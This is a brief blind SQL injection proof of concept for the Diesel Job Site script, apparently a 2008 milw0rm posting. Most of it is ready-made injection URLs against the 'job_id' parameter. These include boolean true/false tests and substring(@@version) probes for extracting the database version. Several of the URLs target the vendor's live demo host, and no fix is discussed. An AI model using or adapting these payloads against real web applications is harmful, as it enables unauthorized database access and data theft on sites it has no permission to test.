@@ -1,0 +1,25 @@
+Diesel Job Site Blind Sql Injection P0c
+Author : Stack
+Home Script :  http://www.dieselscripts.com
+
+Desc :
+look the select Job Viewed: in [real id]+and+1=1 (true) the times change each time
+but in [real id]+and+1=0 (false) it remains stable
+ 
+go to url exploit or poc 2 or 3 times for see the difference
+between (true) and (false)
+ 
+P0c :
+http://site.il/jobs/jobseekers/job-info.php?job_id=[real id]+and+1=1
+http://site.il/jobs/jobseekers/job-info.php?job_id=[real id]+and+1=0
+Exploit :
+http://site.il/jobs/jobseekers/job-info.php?job_id=[real id]+and+substring(@@version,1,1)=5
+http://site.il/jobs/jobseekers/job-info.php?job_id=[real id]+and+substring(@@version,1,1)=4
+Live Demo P0c :
+http://www.dieselscripts.com/demo/jobs/jobseekers/job-info.php?job_id=56+and+1=1
+http://www.dieselscripts.com/demo/jobs/jobseekers/job-info.php?job_id=56+and+1=0
+Live Demo Exploit :
+http://www.dieselscripts.com/demo/jobs/jobseekers/job-info.php?job_id=56+and+substring(@@version,1,1)=5
+http://www.dieselscripts.com/demo/jobs/jobseekers/job-info.php?job_id=56+and+substring(@@version,1,1)=4
+
+# milw0rm.com [2008-09-21]
